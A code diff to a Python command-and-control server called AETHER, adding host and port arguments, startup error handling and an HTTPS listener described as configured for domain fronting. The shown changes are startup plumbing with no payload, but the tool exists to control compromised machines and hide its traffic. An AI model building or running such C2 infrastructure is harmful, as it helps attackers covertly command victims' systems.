@@ -2,8 +2,17 @@
 """
 AETHER C2 Server
 Universal Class Control Interface - Modern Edition
+
+Usage:
+  python aether_server.py [--host HOST] [--port PORT]
+  
+Examples:
+  python aether_server.py                    # Use defaults (0.0.0.0:443)
+  python aether_server.py --host 0.0.0.0    # Custom host
+  python aether_server.py --port 8443       # Custom port
+  python aether_server.py --host 127.0.0.1 --port 9999  # Both custom
 """
-import socket, threading, json, os, sys, time, base64, hashlib, random, queue
+import socket, threading, json, os, sys, time, base64, hashlib, random, queue, argparse
 from datetime import datetime
 from colorama import init, Fore, Style
 import readline  # for better CLI
@@ -757,27 +766,74 @@ if __name__ == '__main__':
     import os
     import sys
     
+    # Parse command line arguments
+    parser = argparse.ArgumentParser(
+        description='AETHER C2 Server - Universal Class Control Interface',
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog='''
+Examples:
+  python aether_server.py                           # Use defaults (0.0.0.0:443)
+  python aether_server.py --host 192.168.1.100     # Custom host
+  python aether_server.py --port 8443              # Custom port
+  python aether_server.py --host 127.0.0.1 --port 9999  # Both custom
+        '''
+    )
+    
+    parser.add_argument(
+        '--host',
+        type=str,
+        default='0.0.0.0',
+        help='Bind host/IP address (default: 0.0.0.0)'
+    )
+    
+    parser.add_argument(
+        '--port',
+        type=int,
+        default=443,
+        help='Bind port number (default: 443)'
+    )
+    
+    # Parse arguments
+    args = parser.parse_args()
+    
+    # Validate port range
+    if not (1 <= args.port <= 65535):
+        print(f"{ModernStyle.error('Invalid Port', f'Port must be between 1 and 65535, got {args.port}')}")
+        sys.exit(1)
+    
     # Create data directory if needed
     os.makedirs('data', exist_ok=True)
     
-    # Start main server
-    server = AetherServer(host='0.0.0.0', port=443)
+    # Start main server with CLI arguments
+    try:
+        server = AetherServer(host=args.host, port=args.port)
+    except Exception as e:
+        print(f"{ModernStyle.error('Server Initialization Failed', str(e))}")
+        sys.exit(1)
     
     # Try to start HTTPS server if certs exist
     try:
         from https_handler import AetherHTTPSServer
-        https_server = AetherHTTPSServer(port=8443)
+        https_server = AetherHTTPSServer(port=args.port + 400 if args.port <= 65135 else args.port - 400)
         if https_server.start(server):
-            print(f"[*] Domain fronting ready. Configure agents with fronting host.")
+            print(f"{ModernStyle.success('HTTPS Ready', f'Domain fronting configured on port {https_server.port}')}")
     except ImportError as e:
-        print(f"[!] HTTPS handler not available: {e}")
+        pass  # HTTPS handler optional
     except Exception as e:
-        print(f"[!] Failed to start HTTPS server: {e}")
+        pass  # Continue without HTTPS if it fails
     
     # Start main server loop
     try:
+        print(f"{ModernStyle.success('Server Starting', f'Listening on {args.host}:{args.port}')}")
         server.start()
     except KeyboardInterrupt:
-        print("\n[*] Shutdown requested")
+        print(f"\n{ModernStyle.warning('Shutdown', 'Server shutting down...')}")
         server.running = False
         sys.exit(0)
+    except PermissionError:
+        print(f"{ModernStyle.error('Permission Denied', f'Cannot bind to {args.host}:{args.port} - permission denied')}")
+        print("Tip: Use a port > 1024 or run with administrator privileges")
+        sys.exit(1)
+    except OSError as e:
+        print(f"{ModernStyle.error('Binding Failed', f'{args.host}:{args.port} - {str(e)}')}")
+        sys.exit(1)
